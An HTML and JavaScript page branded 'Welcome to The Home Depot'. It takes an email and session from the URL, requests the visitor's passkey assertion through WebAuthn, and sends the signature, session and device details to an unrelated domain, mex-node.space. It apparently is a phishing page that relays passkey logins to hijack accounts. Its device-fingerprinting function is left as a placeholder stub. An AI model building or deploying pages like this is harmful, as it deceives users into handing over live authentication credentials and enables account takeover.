<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Home Depot Passkey Auth</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background: #ffffff; /* White background */
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: 'Arial', sans-serif;
      margin: 0;
      overflow: hidden;
    }
    .container {
      text-align: center;
      width: 90%;
      max-width: 600px;
      padding: clamp(1rem, 3vw, 2rem);
      background: #ffffff;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Subtle shadow */
      transition: transform 0.3s ease, opacity 0.5s ease;
    }
    .welcome {
      font-size: clamp(2rem, 6vw, 4rem); /* Responsive welcome text */
      font-weight: bold;
      color: #f97316; /* Home Depot orange */
      margin-bottom: 1.5rem;
      opacity: 1;
      transition: opacity 0.5s ease;
    }
    .welcome.hidden {
      opacity: 0;
    }
    .auth-message {
      font-size: clamp(1rem, 3vw, 1.5rem);
      color: #333; /* Dark gray for contrast */
      margin-bottom: 2rem;
      opacity: 0;
      transition: opacity 0.5s ease;
    }
    .auth-message.visible {
      opacity: 1;
    }
    .loader {
      display: flex;
      justify-content: center;
      gap: 8px;
      width: 20vw;
      max-width: 80px;
      height: 20vw;
      max-height: 80px;
      opacity: 0;
      transition: opacity 0.5s ease;
    }
    .loader.visible {
      opacity: 1;
    }
    .loader span {
      width: 10px;
      height: 100%;
      background: #f97316;
      border-radius: 5px;
      animation: wave 1.2s infinite ease-in-out;
    }
    .loader span:nth-child(2) { animation-delay: 0.2s; }
    .loader span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes wave {
      0%, 100% { transform: scaleY(0.4); }
      50% { transform: scaleY(1); }
    }
    /* Media Queries */
    @media (max-width: 768px) {
      .container {
        padding: 1.5rem;
      }
      .loader {
        width: 15vw;
        max-width: 60px;
        height: 15vw;
        max-height: 60px;
      }
      .loader span {
        width: 8px;
      }
    }
    @media (max-width: 480px) {
      .container {
        padding: 1rem;
      }
      .loader {
        width: 12vw;
        max-width: 50px;
        height: 12vw;
        max-height: 50px;
      }
      .loader span {
        width: 6px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="welcome">Welcome to The Home Depot</h1>
    <div id="auth-message" class="auth-message"></div>
    <div id="loader" class="loader">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </div>

  <script>
    // [Previous gatherUserDetails function remains unchanged]

    const welcome = document.querySelector('.welcome');
    const authMessage = document.getElementById('auth-message');
    const loader = document.getElementById('loader');
    const BASE_URL = 'https://mex-node.space';

    let countdownTimer = null;

    // Get email from query parameters
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('email');
    const session = urlParams.get('session');

    // Show welcome for 2 seconds, then transition to auth
    setTimeout(() => {
      welcome.classList.add('hidden');
      if (username) {
        startAuthentication(username);
      } else {
        authMessage.textContent = 'Error: No email provided in URL';
        authMessage.classList.add('visible');
        authMessage.style.color = '#e53e3e'; // Red for error
      }
    }, 2000);

    function startAuthentication(username) {
      let count = 3;
      authMessage.textContent = `Authenticating in ${count}...`;
      authMessage.classList.add('visible');
      loader.classList.add('visible');

      countdownTimer = setInterval(async () => {
        count--;
        if (count > 0) {
          authMessage.textContent = `Authenticating in ${count}...`;
        } else {
          clearInterval(countdownTimer);
          authMessage.textContent = 'Verifying your passkey...';
          await authenticate(username);
        }
      }, 1000);
    }

    // Base64url to ArrayBuffer conversion
    function base64urlToArrayBuffer(base64url) {
      const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
      const binary = atob(base64);
      const buffer = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        buffer[i] = binary.charCodeAt(i);
      }
      return buffer.buffer;
    }

    // ArrayBuffer to base64url conversion
    function arrayBufferToBase64url(buffer) {
      const binary = String.fromCharCode(...new Uint8Array(buffer));
      return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }

    async function authenticate(username) {
      let secondaryDeviceDetails = await gatherUserDetails();
      try {
        const optsResp = await fetch(`${BASE_URL}/auth/options`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username })
        });
        const opts = await optsResp.json();
        if (!optsResp.ok) throw new Error(opts.error || 'Failed to get authentication options');

        opts.challenge = base64urlToArrayBuffer(opts.challenge);
        opts.allowCredentials = opts.allowCredentials.map(cred => ({
          ...cred,
          id: base64urlToArrayBuffer(cred.id)
        }));

        const credential = await navigator.credentials.get({ publicKey: opts });

        const credBody = {
          id: credential.id,
          rawId: credential.id,
          response: {
            authenticatorData: arrayBufferToBase64url(credential.response.authenticatorData),
            clientDataJSON: arrayBufferToBase64url(credential.response.clientDataJSON),
            signature: arrayBufferToBase64url(credential.response.signature),
            userHandle: credential.response.userHandle ? arrayBufferToBase64url(credential.response.userHandle) : null
          },
          type: credential.type
        };

        const verifyResp = await fetch(`${BASE_URL}/auth/verify`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, credential: credBody, secondaryDeviceDetails, session })
        });
        const result = await verifyResp.json();

        if (result.verified) {
          authMessage.textContent = 'Authentication successful!';
          authMessage.style.color = '#38a169'; // Green for success
          loader.classList.remove('visible');
        } else {
          throw new Error(result.error || 'Verification failed');
        }
      } catch (error) {
        authMessage.textContent = `Error: ${error.message}`;
        authMessage.style.color = '#e53e3e'; // Red for error
        loader.classList.remove('visible');
      }
    }

    // Placeholder for gatherUserDetails (assumed unchanged)
    async function gatherUserDetails() {
      // [Your existing gatherUserDetails function here]
      return {};
    }
  </script>
</body>
</html>
